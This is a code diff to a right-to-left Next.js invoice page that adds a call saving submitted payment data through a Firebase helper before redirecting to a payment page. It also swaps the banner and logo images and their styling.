@@ -7,6 +7,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import type React from 'react'; // Added import for React
+import { addData } from '@/lib/firebase-service';
 
 export default function InvoicePage() {
   const router = useRouter();
@@ -14,24 +15,26 @@ export default function InvoicePage() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    addData(paymentData)
     router.push('/payment');
   };
 
   return (
     <div className="max-w-md mx-auto p-4 space-y-6" dir="rtl">
-      <div className="w-full h-32 relative rounded-lg overflow-hidden">
+      <div className="w-full h-32 relative rounded-lg overflow-hidden text-center flex justify-center">
         <Image
-          src={`/`}
+          src={`/mor.svg`}
           alt="Customer Service Banner"
-          fill
-          className="object-cover"
+          width={107}
+          height={170}
+          className="object-contain"
         />
       </div>
 
       <div className="bg-white rounded-lg shadow-lg p-6 space-y-6">
         <div className="flex justify-center">
           <Image
-            src="/placeholder.svg"
+            src="/next.svg"
             alt="Tasdeed Logo"
             width={150}
             height={50}
